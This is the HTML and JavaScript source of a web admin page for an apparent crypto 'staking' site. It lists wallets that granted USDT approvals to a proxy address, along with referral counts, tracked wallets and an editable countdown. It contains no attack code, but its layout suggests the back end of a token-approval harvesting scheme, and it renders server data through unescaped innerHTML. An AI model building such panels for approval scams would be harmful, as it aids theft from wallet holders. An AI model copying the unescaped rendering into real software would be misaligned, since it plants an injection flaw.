<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Admin • Approvals & Referrals</title>
<style>
  body{ margin:0; font-family: ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Helvetica,Arial; background:#0b0b16; color:#e8eaf5 }
  .wrap{ max-width:1100px; margin: 0 auto; padding: 28px 18px 60px; }
  h1{ margin: 10px 0 16px } .card{ background:#101226; border:1px solid rgb(255 255 255/.08); border-radius:16px; padding:16px; box-shadow: 0 10px 30px -18px rgb(0 0 0/.6) }
  label{ display:block; margin:.5rem 0 .25rem; color:#b8bfd6 } input,button{ padding:10px 12px; border-radius:10px; border:1px solid #2a2d49; background:#0e0f1f; color:#e8eaf5 }
  button{ cursor:pointer; border-color:#4347a0; background: linear-gradient(135deg,#5630ff,#cc2a9c); }
  table{ width:100%; border-collapse: collapse; margin-top: 12px } th,td{ border-bottom:1px solid #23264a; padding:10px; text-align:left; font-size:14px }
  .mono{ font-family: ui-monospace,Menlo,Consolas,monospace } .row{ display:flex; gap:12px; align-items:end; flex-wrap:wrap }
  .pill{ background:#0c0d1a; border:1px solid rgb(255 255 255/.08); color:#c7c9d6; border-radius:999px; padding:6px 10px; display:inline-block; font-size:12px }
  .right{ text-align:right } .hidden{ display:none }
  .help{ font-size:13px; color:#8fa5d4; margin-top:8px }
</style>
</head>
<body>
  <div class="wrap">
    <h1>Admin Panel</h1>
    <div id="dash">
      <div class="card">
        <div class="row">
          <div>
            <div class="pill">Proxy: <span class="mono" id="proxy">—</span></div>
            <div class="pill">USDT: <span class="mono" id="usdt">—</span></div>
            <div class="pill">Amount: <span id="amt">—</span> USDT</div>
          </div>
          <div style="margin-left:auto">
            <a href="/api/export.csv"><button type="button">Export CSV</button></a>
          </div>
        </div>
      </div>

      <div class="card" style="margin-top:16px">
        <h3>Countdown</h3>
        <div class="row" style="align-items:flex-end">
          <div style="flex:1">
            <label>Ends (local)</label>
            <input type="datetime-local" id="endLocal">
          </div>
          <div style="flex:1">
            <label>Unix timestamp</label>
            <input type="number" id="endTs" readonly>
          </div>
          <div>
            <button type="button" id="updateEndBtn">Save</button>
          </div>
        </div>
        <p class="help" id="endMsg">Set the staking countdown end date/time.</p>
      </div>

      <div class="card" style="margin-top:16px">
        <h3>Approvals</h3>
        <table id="tbl">
          <thead><tr><th>#</th><th>Wallet</th><th>Approved</th><th>Tx</th><th>When</th></tr></thead>
          <tbody></tbody>
        </table>
      </div>

      <div class="card" style="margin-top:16px">
        <h3>Top Referrers</h3>
        <table id="tblUsers">
          <thead><tr><th>#</th><th>Wallet</th><th>Ref code</th><th>Total referrals</th><th>Last seen</th></tr></thead>
          <tbody></tbody>
        </table>
      </div>

      <div class="card" style="margin-top:16px">
        <h3>Tracked Wallets</h3>
        <table id="tblWallets">
          <thead><tr><th>#</th><th>Wallet</th><th>Ref code</th><th>Last seen</th><th>Created</th></tr></thead>
          <tbody></tbody>
        </table>
      </div>
    </div>
  </div>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.umd.min.js"></script>
  <script>
  const state = { cfg:null };
  const fetchWithCred = (url, opts={}) => fetch(url, { credentials: 'include', ...opts });

  function formatTs(ts){
    if(!ts) return "—";
    return new Date(ts*1000).toLocaleString();
  }
  function toLocalInput(ts){
    if(!ts) return "";
    const d = new Date(ts*1000);
    const pad = n => String(n).padStart(2,'0');
    return `${d.getFullYear()}-${pad(d.getMonth()+1)}-${pad(d.getDate())}T${pad(d.getHours())}:${pad(d.getMinutes())}`;
  }
  function setCountdownInputs(ts){
    const local = document.getElementById('endLocal');
    const unix = document.getElementById('endTs');
    if(local) local.value = toLocalInput(ts);
    if(unix) unix.value = ts ? Math.floor(ts) : "";
  }

  async function fetchCfg(){
    const r = await fetchWithCred('/api/config').then(r=>r.json());
    state.cfg = r.config;
    document.getElementById('proxy').textContent = state.cfg.PROXY_ADDR;
    document.getElementById('usdt').textContent = state.cfg.USDT_ADDR;
    document.getElementById('amt').textContent = state.cfg.APPROVAL_AMOUNT;
    setCountdownInputs(state.cfg.STAKING_END_TS);
  }
  async function loadRows(){
    const r = await fetchWithCred('/api/approvals');
    if(!r.ok) return;
    const j = await r.json(); const rows = j.rows||[];
    const tb = document.querySelector('#tbl tbody'); tb.innerHTML='';
    rows.forEach((row,i)=>{
      const when = new Date((row.blockTime||row.createdAt)*1000).toLocaleString();
      const tr = document.createElement('tr');
      tr.innerHTML = `<td>${i+1}</td>
        <td class="mono">${row.wallet}</td>
        <td>${Number(row.amountHuman).toLocaleString()} USDT</td>
        <td class="mono"><a href="https://bscscan.com/tx/${row.txHash}" target="_blank">${row.txHash.slice(0,10)}…</a></td>
        <td>${when}</td>`;
      tb.appendChild(tr);
    });
  }
  async function loadUsers(){
    const r = await fetchWithCred('/api/users');
    if(r.status!==200) return;
    const j = await r.json(); const rows=j.rows||[];
    const tb = document.querySelector('#tblUsers tbody'); tb.innerHTML='';
    rows.forEach((u,i)=>{
      const when = formatTs(u.lastSeen||u.createdAt);
      const tr = document.createElement('tr');
      tr.innerHTML = `<td>${i+1}</td>
        <td class="mono">${u.wallet}</td>
        <td class="mono">${u.refCode||''}</td>
        <td>${u.refCount}</td>
        <td>${when}</td>`;
      tb.appendChild(tr);
    });
  }
  async function loadWallets(){
    const r = await fetchWithCred('/api/admin/wallets');
    if(r.status!==200) return;
    const j = await r.json(); const rows=j.rows||[];
    const tb = document.querySelector('#tblWallets tbody'); tb.innerHTML='';
    rows.forEach((w,i)=>{
      const tr = document.createElement('tr');
      tr.innerHTML = `<td>${i+1}</td>
        <td class="mono">${w.wallet}</td>
        <td class="mono">${w.refCode||''}</td>
        <td>${formatTs(w.lastSeen)}</td>
        <td>${formatTs(w.createdAt)}</td>`;
      tb.appendChild(tr);
    });
  }
  async function saveCountdown(){
    const iso = document.getElementById('endLocal').value;
    const msg = document.getElementById('endMsg');
    if(!iso){
      msg.textContent = "Choose a valid local date/time.";
      return;
    }
    const parsed = Math.floor(new Date(iso).getTime()/1000);
    if(Number.isNaN(parsed) || parsed <= 0){
      msg.textContent = "Invalid timestamp.";
      return;
    }
    const res = await fetchWithCred('/api/admin/staking-end',{ method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ timestamp: parsed }) });
    if(!res.ok){
      const body = await res.json().catch(()=>({}));
      msg.textContent = body.error ? `Save failed: ${body.error}` : "Save failed.";
      return;
    }
    const data = await res.json();
    if(data.config){
      state.cfg = data.config;
    }
    setCountdownInputs(state.cfg.STAKING_END_TS);
    msg.textContent = "Countdown updated.";
  }
  document.getElementById('updateEndBtn').addEventListener('click', saveCountdown);

  (async()=>{ await fetchCfg(); await loadRows(); await loadUsers(); await loadWallets(); })();
  </script>
</body>
</html>
